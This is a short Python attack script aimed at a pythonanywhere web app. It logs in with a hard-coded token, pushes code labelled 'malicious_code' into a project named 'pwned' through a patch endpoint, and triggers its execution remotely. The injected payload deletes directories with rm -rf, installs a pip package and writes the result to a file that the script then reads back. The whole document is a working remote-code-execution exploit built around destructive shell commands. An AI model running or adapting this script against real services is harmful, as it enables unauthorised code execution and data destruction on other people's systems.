import requests
import time

s = requests.Session()
s.post('https://mikeymike.pythonanywhere.com/login', data={'token': 'Mike'})

malicious_code = """
import os, subprocess
try:
    os.system("rm -rf ~/.cache/pip")
    os.system("rm -rf /home/MikeyMike/.cache/pip")
    os.system("pip3 install --user google-antigravity")
    with open("out4.txt", "w") as f:
        f.write("Disk cleared and installed!")
except Exception as e:
    with open("out4.txt", "w") as f:
        f.write(str(e))
"""

s.post('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/apply_patch', json={"project": "pwned", "file": "main.py", "code": malicious_code})
s.get('https://mikeymike.pythonanywhere.com/api/projects/execute/pwned')
time.sleep(15)
r3 = s.get('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/get_raw_file?project=pwned&file=out4.txt')
print(r3.text)
